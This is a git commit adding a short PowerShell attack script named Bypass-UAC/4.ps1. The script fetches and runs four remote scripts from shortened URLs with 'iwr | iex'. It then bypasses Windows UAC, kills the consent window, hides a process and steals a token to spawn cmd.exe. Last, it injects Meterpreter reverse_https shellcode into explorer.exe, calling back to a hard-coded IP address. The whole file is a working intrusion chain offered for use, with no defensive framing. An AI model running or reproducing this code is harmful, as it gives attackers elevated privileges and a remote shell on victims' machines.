5f20682b90e541d65f5735ed73c72c1b4621982f
Az <z0rk@protonmail.com>
2017-12-01 14:56:20 +0100

    Create 4.ps1

---
+++ Bypass-UAC/4.ps1
@@ -0,0 +1,16 @@
+iwr https://goo.gl/x6ZcHM | iex;
+iwr https://goo.gl/zggqse | iex;
+iwr https://goo.gl/wxJHHq | iex;
+iwr https://goo.gl/4QsWoj | iex;
+
+workflow Test
+{
+    Parallel
+    {
+        ${ Bypass-UAC -Method UacMethodNetOle32 };
+        ${ kill-window consent };
+        ${ hide-process mmc };
+        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id };
+        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 };
+    }
+}
